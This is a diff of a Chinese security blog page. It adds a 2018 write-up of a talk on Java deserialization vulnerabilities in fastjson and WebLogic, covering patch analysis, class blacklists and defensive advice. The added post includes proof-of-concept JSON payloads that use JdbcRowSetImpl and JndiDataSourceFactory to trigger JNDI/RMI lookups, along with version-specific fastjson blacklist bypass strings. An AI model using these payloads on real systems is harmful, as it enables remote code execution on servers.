@@ -334,6 +334,210 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/06/20/先知议题 Java反序列化实战 解读/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/06/20/先知议题 Java反序列化实战 解读/" itemprop="url">
+                  先知议题 Java反序列化实战 解读
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-20T17:05:27+08:00">
+                2018-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index">
+                    <span itemprop="name">java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/06/20/先知议题 Java反序列化实战 解读/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/06/20/先知议题 Java反序列化实战 解读/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/06/20/先知议题 Java反序列化实战 解读/" class="leancloud_visitors" data-flag-title="先知议题 Java反序列化实战 解读">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="1-议题和个人介绍"><a href="#1-议题和个人介绍" class="headerlink" title="1 议题和个人介绍"></a>1 议题和个人介绍</h1><h2 id="1-1-议题概述"><a href="#1-1-议题概述" class="headerlink" title="1.1 议题概述"></a>1.1 议题概述</h2><p>2017年又是反序列漏洞的大年，涌现了许多经典的因为反序列化导致的远程代码执行漏洞，像fastjson，jackson，struts2，weblogic这些使用量非常大的产品都存在这类漏洞，但不幸的是，这些漏洞的修复方式都是基于黑名单，每次都是旧洞未补全，新洞已面世。随着虚拟货币的暴涨，这些直接的远程执行代码漏洞都成了挖矿者的乐园。<br>本议题将从那些经典案例入手，分析攻击方和防御方的对抗过程。首先是fastjson的最近的安全补丁的分析，由于黑名单做了加密处理，这里会展开如何得到其黑名单，如何构造PoC。当然2018年的重点还是weblogic，由我给大家剖析CVE-2018-2628及其他Weblogic经典漏洞，带大家傲游反序列化的世界，同时也是希望开发者多多借鉴做好安全编码。</p>
+<h2 id="1-2-个人简介："><a href="#1-2-个人简介：" class="headerlink" title="1.2 个人简介："></a>1.2 个人简介：</h2><p>本文作者来自绿盟科技，现任网络安全攻防实验室安全研究经理，安全行业从业七年，是看雪大会讲师，Pycon大会讲师，央视专访嘉宾，向RedHat、Apache、Amazon，Weblogic，阿里提交多份RCE漏洞报告，最近的Weblogic CVE-2018-2628就是一个。</p>
+<p>个人博客：xxlegend.com 个人公众号:廖新喜</p>
+<h1 id="2-反序列化入门"><a href="#2-反序列化入门" class="headerlink" title="2 反序列化入门"></a>2 反序列化入门</h1><p>序列化和反序列化是java引入的数据传输存储接口，序列化是用于将对象转换成二进制串存储，对应着writeObject，而反序列正好相反，将二进制串转换成对象，对应着readObject，类必须实现反序列化接口，同时设置serialVersionUID以便适用不同jvm环境。<br>可通过SerializationDumper这个工具来查看其存储格式,工具直接可在github上搜索.主要包括Magic头：0xaced,TC_OBJECT:0x73,TC_CLASS:0x72,serialVersionUID,newHandle<br>使用场景:<br>• http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等<br>• Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）<br>• xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）<br>• json(Jackson，fastjson) http请求中包含</p>
+<p>反序列攻击时序图:<br><img src="/images/SequenceDiagram1.png" alt="1"></p>
+<p>常见的反序列化项目：<br>• Ysoserial 原生序列化PoC生成<br>• Marshalsec 第三方格式序列化PoC生成<br>• Freddy burp反序列化测试插件<br>• Java-Deserialization-Cheat-Sheet</p>
+<h1 id="3-fastjson"><a href="#3-fastjson" class="headerlink" title="3 fastjson"></a>3 fastjson</h1><h2 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1 简介"></a>3.1 简介</h2><p>Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序<br>快速匹配”的算法，号称Java语言中最快的JSON库。提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化，示例代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User user = <span class="keyword">new</span> User(<span class="string">"guest"</span>,<span class="number">2</span>);</div><div class="line">String jsonString = JSON.toJSONString(user)</div><div class="line"></div><div class="line">String jsonString = <span class="string">"&#123;\"name\":\"guest\",\"age\":12&#125;"</span></div><div class="line">User user = (User)JSON.parse(jsonString)</div></pre></td></tr></table></figure></p>
+<p>Fastjson PoC分类<br>主要分为两大类，一个是基于TemplateImpl，另外就是基于基于JNDI，基于JNDI的又可分为<br>a) Bean Property类型<br>b) Field类型<br>可以参考Demo：<a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="external">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a></p>
+<p>fastjson为了防止研究人员研究它的黑名单，想出了一套新的黑名单机制，这套黑名单是基于具体类的hash加密算法，不可逆。如果是简单穷举，基本算不出来，后来我想到这些库的黑名单肯定都在Maven仓库中，于是写了个爬虫，爬取Maven仓库下所有类，然后正向匹配输出真正的黑名单类。</p>
+<h2 id="3-2-fastjson最近的几个经典漏洞"><a href="#3-2-fastjson最近的几个经典漏洞" class="headerlink" title="3.2 fastjson最近的几个经典漏洞"></a>3.2 fastjson最近的几个经典漏洞</h2><p>下面这段代码是fastjson用来自定义loadClass的实现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</div><div class="line">	<span class="comment">//省略</span></div><div class="line">     <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</div><div class="line">         Class&lt;?&gt; componen/tType = loadClass(className.substring(<span class="number">1</span>), classLoader);</div><div class="line">         <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</div><div class="line">     &#125;</div><div class="line"></div><div class="line">     <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</div><div class="line">         String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</div><div class="line">         <span class="keyword">return</span> loadClass(newClassName, classLoader);</div><div class="line">     &#125;</div><div class="line"></div><div class="line">     <span class="keyword">try</span> &#123;</div><div class="line">         <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</div><div class="line">             clazz = classLoader.loadClass(className);</div></pre></td></tr></table></figure></p>
+<p>首先我们来看一个经典的PoC，<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot; &quot;autoCommit&quot;:true}</code>,关于这个PoC的解读在我博客上有，这里不再详述，但是今天我们要讲的是前面贴出的一段loadClass导致的一系列漏洞，首先看1.2.41的绕过方法是<code>Lcom.sun.rowset.RowSetImpl;</code>,当时看到这个PoC的时候就在想官方不会只去掉一次第一个字符<code>L</code>和最后一个字符<code>；</code>吧，果不其然，在官方的修补方案中，如果以<code>L</code>打头，<code>；</code>结尾则会去掉打头和结尾。当时我就发了一个感概：补丁未出，漏洞已行。很显然，1.2.42的绕过方法是<code>LLcom.sum.rowset.RowSetImpl;;</code>,细心的读者还会看到loadClass的第一个if判断中还有<code>[</code>打头部分，所以就又有了1.2.43的绕过方法是 [com.sun.rowset.RowSetImp.<br>在官方版本1.2.45黑名单中又添加了ibatis的黑名单，PoC如下:<code>{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:{&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}}</code>，首先这是一个基于JNDI的PoC，为了更加理解这个PoC，我们还是先来看一下JndiDataSourceFactory的源码。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiDataSourceFactory</span> <span class="keyword">implements</span> <span class="title">DataSourceFactory</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DATA_SOURCE = <span class="string">"data_source"</span>;</div><div class="line">  <span class="comment">//省略</span></div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProperties</span><span class="params">(Properties properties)</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      InitialContext initCtx = <span class="keyword">null</span>;</div><div class="line">      Hashtable env = getEnvProperties(properties);</div><div class="line">      <span class="keyword">if</span> (env == <span class="keyword">null</span>) &#123;</div><div class="line">        initCtx = <span class="keyword">new</span> InitialContext();</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        initCtx = <span class="keyword">new</span> InitialContext(env);</div><div class="line">      &#125;</div><div class="line">      <span class="comment">//省略</span></div><div class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</div><div class="line">        dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceException(<span class="string">"There was an error configuring JndiDataSourceTransactionPool. Cause: "</span> + e, e);</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
+<p>其本质还是通过bean操作接口set来调用setProperties，然后触发JNDI查询。</p>
+<h1 id="4-weblogic"><a href="#4-weblogic" class="headerlink" title="4 weblogic"></a>4 weblogic</h1><p>Weblogic是第一个成功商业化的J2EE应用服务器，在大型企业中使用非常广泛。在Oracle旗下，可以与其他Oracle产品强强联手，WebLogic Server Java EE 应用基于标准化、模块化的组件，WebLogic Server 为这些模块提供了一组完整的服务，无需编程即可自动处理应用行为的许多细节，另外其独有的T3协议采用序列化实现。下图就是weblogic的历史漏洞展示：<br><img src="/images/weblogic_history_CVES.png" alt="2"></p>
+<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>基于T3<br>• 新的攻击面<br>• 基于commons-collections<br>• 采用黑名单修复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections.functors* *</div><div class="line">com.sun.org.apache.xalan.internal.xsltc.trax* *</div><div class="line">javassist* *</div><div class="line">org.codehaus.groovy.runtime.ConvertedClosure</div><div class="line">org.codehaus.groovy.runtime.ConversionHandler</div><div class="line">org.codehaus.groovy.runtime.MethodClosure</div></pre></td></tr></table></figure></p>
+<p>• 作用位置有限<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream</div><div class="line">weblogic.rjvm.MsgAbbrevInputStream.class</div><div class="line">weblogic.iiop.Utils.class</div></pre></td></tr></table></figure></p>
+<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>首先来看下漏洞位置，在readExternal位置，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">  		<span class="keyword">super</span>.readExternal(var1);</div><div class="line">  		<span class="comment">//省略</span></div><div class="line">              ByteArrayInputStream var4 = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.buffer);</div><div class="line">              ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</div><div class="line">              <span class="comment">//省略</span></div><div class="line">              <span class="keyword">try</span> &#123;</div><div class="line">                  <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</div><div class="line">                      <span class="keyword">this</span>.writeObject(var5.readObject());</div><div class="line">                  &#125;</div><div class="line">              &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</div></pre></td></tr></table></figure></p>
+<p>再来看看补丁，加了一个FilteringObjectInputStream过滤接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">    		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">        		<span class="keyword">super</span>.readExternal(var1);</div><div class="line">        		<span class="comment">//省略</span></div><div class="line">                    <span class="keyword">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)in)</div><div class="line">                    BufferInputStream is = <span class="keyword">this</span>.payload.getInputStream();</div><div class="line">                    FilteringObjectInputStream var5 = <span class="keyword">new</span> FilteringObjectInputStream(var4);</div><div class="line">                    <span class="comment">//省略</span></div><div class="line">                    <span class="keyword">try</span> &#123;</div><div class="line">                        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</div><div class="line">                            <span class="keyword">this</span>.writeObject(var5.readObject());</div><div class="line">                        &#125;</div><div class="line">                    &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</div><div class="line">```                    </div><div class="line">FilteringObjectInputStream的实现如下：</div><div class="line">```java</div><div class="line">   <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="title">FilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">      <span class="keyword">super</span>(in);</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(java.io.ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</div><div class="line">      String className = descriptor.getName();</div><div class="line">      <span class="keyword">if</span>(className != <span class="keyword">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className)) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"Unauthorized deserialization attempt"</span>, descriptor.getName());</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">         <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(descriptor);</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其实就是在resolveClass位置加了一层黑名单控制。</p>
+<h2 id="基于XMLDecoder"><a href="#基于XMLDecoder" class="headerlink" title="基于XMLDecoder"></a>基于XMLDecoder</h2><p>• CVE-2017-3506 由于使用了存在反序列化缺陷XMLDecoder导致的漏洞<br>• CVE-2017-10271 是3506的绕过<br>• 都是挖矿主力军<br>• 基于http协议<br>详细解读可参考我的博客：<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/</a></p>
+<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerChannelInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> <span class="keyword">implements</span> <span class="title">ServerChannelStream</span> </span>&#123;</div><div class="line">   <span class="function"><span class="keyword">protected</span> Class <span class="title">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</div><div class="line">      String className = descriptor.getName();</div><div class="line">      <span class="keyword">if</span>(className != <span class="keyword">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> </div><div class="line">      	&amp;&amp; ClassFilter.isBlackListed(className)) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"Unauthorized deserialization attempt"</span>, descriptor.getName());</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">         Class c = <span class="keyword">super</span>.resolveClass(descriptor);</div><div class="line">   		<span class="comment">//省略</span></div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   <span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</div><div class="line">      String[] arr$ = interfaces;</div><div class="line">      <span class="keyword">int</span> len$ = interfaces.length;</div><div class="line"></div><div class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</div><div class="line">         String intf = arr$[i$];</div><div class="line">         <span class="keyword">if</span>(intf.equals(<span class="string">"java.rmi.registry.Registry"</span>)) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Unauthorized proxy deserialization"</span>);</div><div class="line">         &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">return</span> <span class="keyword">super</span>.resolveProxyClass(interfaces);</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
+<p>CVE-2017-3248 这个漏洞是根据JRMPListener来构造的，从这个补丁也可以看出，在resolveClass和resolveProxyClass都设置了黑名单。</p>
+<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>这个漏洞是我报给Oracle官方的，但是他们并没有修复完全，导致后来这个漏洞被滥用。<br>• 完美绕过CVE-2017-3248<br>• 基于StreamMessage封装<br>• 利用java.rmi.activation.Activator绕过补丁中对java.rmi.registry.Registry的限制<br>• Proxy非必须项<br>攻击示意图如下：<br><img src="/images/CVE-2018-2628.png" alt="3"><br>简单分析可见：<a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
+<h1 id="5-反序列化防御"><a href="#5-反序列化防御" class="headerlink" title="5 反序列化防御"></a>5 反序列化防御</h1><h2 id="5-1-Weblogic防御"><a href="#5-1-Weblogic防御" class="headerlink" title="5.1 Weblogic防御"></a>5.1 Weblogic防御</h2><p>• 过滤T3协议，限定可连接的IP<br>• 设置Nginx反向代理，实现t3协议和http协议隔离<br>• JEP290（JDK8u121，7u131，6u141），这个机制主要是在每层反序列化过程中都加了一层黑名单处理，黑名单如下：<br>黑名单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">maxdepth=100;</div><div class="line">!org.codehaus.groovy.runtime.ConvertedClosure;</div><div class="line">!org.codehaus.groovy.runtime.ConversionHandler;</div><div class="line">!org.codehaus.groovy.runtime.MethodClosure;</div><div class="line">!org.springframework.transaction.support.AbstractPlatformTra</div><div class="line">nsactionManager;</div><div class="line">!sun.rmi.server.UnicastRef;</div><div class="line">!org.apache.commons.collections.functors.*;</div><div class="line">!com.sun.org.apache.xalan.internal.xsltc.trax.*;</div><div class="line">!javassist.*</div></pre></td></tr></table></figure></p>
+<p>当然也有失效的时候，就是发现了新的gadget。这也促使Oracle开始放弃反序列化支持。</p>
+<h2 id="5-2-原生反序列化防御"><a href="#5-2-原生反序列化防御" class="headerlink" title="5.2 原生反序列化防御"></a>5.2 原生反序列化防御</h2><p>• 不要反序列化不可信的数据<br>• 给反序列数据加密签名，并确保解密在反序列之前<br>• 给反序列化接口添加认证授权<br>• 反序列化服务只允许监听在本地或者开启相应防火墙<br>• 升级第三方库<br>• 升级JDK，JEP290</p>
+<h1 id="6-招人"><a href="#6-招人" class="headerlink" title="6 招人"></a>6 招人</h1><p>绿盟科技Web攻防实验室欢迎各位应聘，招聘大牛和实习生。团队专注于最前沿的Web攻防研究，大数据分析，前瞻性攻击与检测预研.<br>联系邮箱： liaoxinxi[@]nsfocus.com 或者liwenjin[@]nsfocus.com</p>
+<p>pdf:<br>
+
+	<div class="row">
+    <embed src="../../../../images/先知大会议题Java反序列化实战.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/04/18/CVE-2018-2628 简单复现和分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2042,178 +2246,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/07/08/S2-048 动态分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/07/08/S2-048 动态分析/" itemprop="url">
-                  S2-048 动态分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-08T03:26:42+08:00">
-                2017-07-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Struts2/" itemprop="url" rel="index">
-                    <span itemprop="name">Struts2</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/07/08/S2-048 动态分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/07/08/S2-048 动态分析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/07/08/S2-048 动态分析/" class="leancloud_visitors" data-flag-title="S2-048 动态分析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><p>2017年7月7日，Apache Struts发布最新的安全公告，Apache Structs2的strus1插件存在远程代码执行的高危漏洞，漏洞编号为CVE-2017-9791（S2-048）。攻击者可以构造恶意的字段值通过Struts2的struts2-struts1-plugin的插件，远程执行代码</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>(1)    漏洞简介<br>Apache Struts2.3.x系列版本中struts2-struts1-plugin存在远程代码执行漏洞，进而导致任意代码执行。<br>(2)    漏洞分析<br>官方的漏洞描述如下：</p>
